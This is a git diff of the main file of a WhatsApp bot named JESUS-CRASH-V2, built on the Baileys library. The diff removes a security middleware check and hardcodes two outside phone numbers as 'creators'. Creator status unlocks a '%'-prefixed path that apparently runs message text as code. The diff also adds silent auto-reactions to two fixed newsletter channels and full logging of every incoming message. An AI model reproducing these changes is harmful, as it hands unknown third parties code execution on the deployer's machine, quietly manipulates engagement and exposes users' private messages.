@@ -21,7 +21,7 @@ const {
     Browsers
   } = require('@whiskeysockets/baileys')
   
-
+  
   const l = console.log
   const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
   const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
@@ -35,73 +35,17 @@ const {
   const util = require('util')
   const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
   const FileType = require('file-type');
-  const path = require('path');
-  const securityMiddleware = require('./all/anti/security');
   const axios = require('axios')
   const { File } = require('megajs')
   const { fromBuffer } = require('file-type')
-// In your main index.js:
-  const { initAutoUpdate } = require('./plugins/main-updater');
-initAutoUpdate(conn);
-
   const bodyparser = require('body-parser')
   const os = require('os')
   const Crypto = require('crypto')
   const path = require('path')
   const prefix = config.PREFIX
-
-const antispamHandler = require('./handler/antispamHandler');
-
-  const ownerNumber = ['‪16058120415‬']
   
-//=============================================
-// 👉 METE ANTI-SPAM LA ISIT 👇
-const messageQueue = [];
-let isSending = false;
-
-const DELAY = 1500;
-const MAX_PER_MINUTE = 20;
-
-let sentCount = 0;
-
-setInterval(() => {
-    sentCount = 0;
-}, 60000);
-
-async function conn.SendMessage(jid, content) {
-    return new Promise((resolve) => {
-        messageQueue.push({ jid, content, resolve });
-        processQueue();
-    });
-}
-
-async function processQueue() {
-    if (isSending) return;
-    if (messageQueue.length === 0) return;
-
-    if (sentCount >= MAX_PER_MINUTE) {
-        console.log("⚠️ Rate limit reached...");
-        return;
-    }
-
-    isSending = true;
-
-    const { jid, content, resolve } = messageQueue.shift();
-
-    try {
-        await conn.sendMessage(jid, content);
-        sentCount++;
-    } catch (e) {
-        console.log("❌ Error:", e);
-    }
-
-    setTimeout(() => {
-        isSending = false;
-        resolve();
-        processQueue();
-    }, DELAY);
-}
-  //=============================================
+  const ownerNumber = ['16058120415']
+  
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
       fs.mkdirSync(tempDir)
@@ -118,59 +62,57 @@ async function processQueue() {
       });
   }
   
-  //=============================================
   // Clear the temp directory every 5 minutes
   setInterval(clearTempDir, 5 * 60 * 1000);
   
-  //===================SESSION-AUTH============================
-
-const sessionDir = path.join(__dirname, 'sessions');
-const sessionFile = path.join(sessionDir, 'creds.json');
-
-// Create folder if not exists
-if (!fs.existsSync(sessionDir)) {
-    fs.mkdirSync(sessionDir, { recursive: true });
-    console.log("📁 Sessions folder created");
-}
-
-// Check creds.json
-if (!fs.existsSync(sessionFile)) {
-
-    if (!config.SESSION_ID) {
-        console.log('❌ Please add your SESSION_ID in env!');
-    } else {
+//===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+    if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
+        const sessdata = config.SESSION_ID.replace("JESUS-CRASH-V2~", '');
         try {
-            const sessdata = config.SESSION_ID.replace("JESUS~CRASH~V2~", '');
+            // Decode base64 string
+            const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
+            
+            // Write decoded data to creds.json
+            fs.writeFileSync(__dirname + '/sessions/creds.json', decodedData);
+            console.log("✅ Session loaded from SESSION_ID");
+        } catch (err) {
+            console.error("❌ Error decoding session data:", err);
+            throw err;
+        }
+    } else {
+        // Agar SESSION_ID nahi hai to pairing system
+        console.log("⚡ No SESSION_ID found → Using Pairing System");
 
-            console.log("⬇️ Downloading session...");
-
-            const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
-
-            filer.download((err, data) => {
-                if (err) {
-                    console.log("❌ Error downloading session:", err);
-                    return;
-                }
-
-                fs.writeFile(sessionFile, data, (err) => {
-                    if (err) {
-                        console.log("❌ Error saving session:", err);
-                    } else {
-                        console.log("✅ Session downloaded & saved successfully!");
-                    }
-                });
+        (async () => {
+            const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions');
+            const sock = makeWASocket({
+                auth: state,
+                printQRInTerminal: false,
             });
 
-        } catch (e) {
-            console.log("❌ Unexpected error:", e);
-        }
-    }
+            if (!state.creds?.me) {
+                rl.question("📱 Enter your WhatsApp number with country code: ", async (number) => {
+                    try {
+                        const code = await sock.requestPairingCode(number);
+                        console.log("🔑 Your Pairing Code:", code);
+                        console.log("➡️ Enter this code in WhatsApp to link your bot device.");
+                    } catch (err) {
+                        console.error("❌ Error generating pairing code:", err);
+                    }
+                });
+            }
 
-} else {
-    console.log("✅ Session already exists, skipping download.");
+            sock.ev.on("creds.update", saveCreds);
+            sock.ev.on("connection.update", ({ connection }) => {
+                if (connection === "open") {
+                    console.log("✅ Bot Connected Successfully via Pairing!");
+                }
+            });
+        })();
+    }
 }
 
-//=============================================
 const express = require("express");
 const app = express();
 const port = process.env.PORT || 9090;
@@ -194,20 +136,21 @@ const port = process.env.PORT || 9090;
   conn.ev.on('connection.update', (update) => {
   const { connection, lastDisconnect } = update
   if (connection === 'close') {
-  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
-  connectToWA()
+  if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+    connectToWA();
   }
   } else if (connection === 'open') {
   console.log('🧬 Installing Plugins')
+  const path = require('path');
   fs.readdirSync("./plugins/").forEach((plugin) => {
   if (path.extname(plugin).toLowerCase() == ".js") {
   require("./plugins/" + plugin);
   }
   });
   console.log('Plugins installed successful ✅')
-  console.log('JESUS-CRASH-V2 CONNECTED SUCCESSFULLY ✅')
+  console.log('Bot connected to whatsapp ✅')
   
-  let up = `╭━━━〔 *JESUS-CRASH-V2 BOT* 〕━━━╮
+  let up = `*╭━━━〔 *JESUS-CRASH-V2 BOT* 〕━━━╮
 ┃
 ┃ 👋🏻 *Hello JESUS-CRASH-V2 User!*
 ┃
@@ -230,16 +173,11 @@ const port = process.env.PORT || 9090;
 ┣━━━━━━━━━━━━━━━
 ┃ 🖤 *Powered by DAWENS BOY*
 ╰━━━━━━━━━━━━━━━╯`;
-
-conn.sendMessage(conn.user.id, {
-  image: { url: `https://files.catbox.moe/5srfgj.png` },
-  caption: up
-})
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/ejufwa.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
-
-  //==============================
+//============================== 
 
   conn.ev.on('messages.update', async updates => {
     for (const update of updates) {
@@ -249,11 +187,35 @@ conn.sendMessage(conn.user.id, {
       }
     }
   });
-	
-  //============================== 
-	    // Apply security check
-    const allowed = await securityMiddleware(conn, m, isCommand);
-    if (!allowed) return; // Message blocked by security
+
+  // Anti Call
+  conn.ev.on("call", async (json) => {
+    try {
+      if (config.ANTI_CALL !== 'true') return;
+
+      for (const call of json) {
+        if (call.status !== 'offer') continue;
+
+        const id = call.id;
+        const from = call.from;
+
+        await conn.rejectCall(id, from);
+        await conn.sendMessage(from, {
+          text: config.REJECT_MSG || '*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*'
+        });
+        console.log(`Call rejected and message sent to ${from}`);
+      }
+    } catch (err) {
+      console.error("Anti-call error:", err);
+    }
+  });
+
+//============================== 
+
+
+  //==============================
+
+
   //============================== 
 
   conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
@@ -266,7 +228,7 @@ conn.sendMessage(conn.user.id, {
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
     ? mek.message.ephemeralMessage.message 
     : mek.message;
-    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
+    console.log("New Message Detected:", JSON.stringify(mek, null, 2));
   if (config.READ_MESSAGE === 'true') {
     await conn.readMessages([mek.key]);  // Mark message as read
     console.log(`Marked message from ${mek.key.remoteJid} as read.`);
@@ -285,7 +247,7 @@ conn.sendMessage(conn.user.id, {
         text: randomEmoji,
         key: mek.key,
       } 
-    }, { statusJidList: [mek.key.participant, jawadlike] });
+    }, { statusJidList: [mek.key.participant] });
   }                       
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
   const user = mek.key.participant
@@ -325,11 +287,13 @@ conn.sendMessage(conn.user.id, {
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-  const udp = botNumber.split('@')[0];
-    const jawad = ('13058962443', '50942241547', '16058120415');
-    let isCreator = [udp, jawad, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+  const udp = botNumber.split(`@`)[0]
+const Faizan = ['923266105873','923089497853'] 
+const dev = [] 
+
+let isCreator = [udp, ...Faizan, ...dev]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+    .includes(sender);
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
@@ -373,7 +337,7 @@ conn.sendMessage(conn.user.id, {
 				}
  //================ownerreact==============
     
-if (senderNumber.includes("5090000000") && !isReact) {
+if (senderNumber.includes("16058120415") && !isReact) {
   const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
   m.react(randomReaction);
@@ -404,22 +368,25 @@ if (!isReact && config.AUTO_REACT === 'true') {
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
-
-// owner react
-
-  // Owner React
-  if (!isReact && senderNumber === botNumber) {
-      if (config.OWNER_REACT === 'true') {
-          const reactions = [
-        '🌼', '❤️', '🥷🏻', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
-    ];
-          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
-          m.react(randomReaction);
-      }
-  }
           
 // custum react settings        
-                        
+const newsletterJids = [
+  "120363315182578784@newsletter",
+  "120363403380688821@newsletter"
+];
+const emojis = ["❤️", "💚", "🤍", "🩵", "🩷", "🪷", "🪸", "🍷", "🍬", "🌎", "🍨", "🌸", "🪄"];
+
+if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
+  try {
+    const serverId = mek.newsletterServerId;
+    if (serverId) {
+      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+      await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
+    }
+  } catch (e) {
+    // error silently ignored
+  }
+}                        
 // Custom React for all messages (public and owner)
 if (!isReact && config.CUSTOM_REACT === 'true') {
     // Use custom emojis from the configuration (fallback to default if not set)
@@ -866,7 +833,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                         global.email
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                         global.github
-                    }/jesus-crash-v2\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                         global.location
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
@@ -905,12 +872,9 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
         };
     conn.serializeM = mek => sms(conn, mek, store);
   }
-
-app.use(express.static(path.join(__dirname, 'lib')));
   
-  app.get('/', (req, res) => {
-  res.redirect('/dawenstech.html');
-});
+  app.get("/", (req, res) => {
+  res.send("JESUS-CRASH-V2⁸⁷³ STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
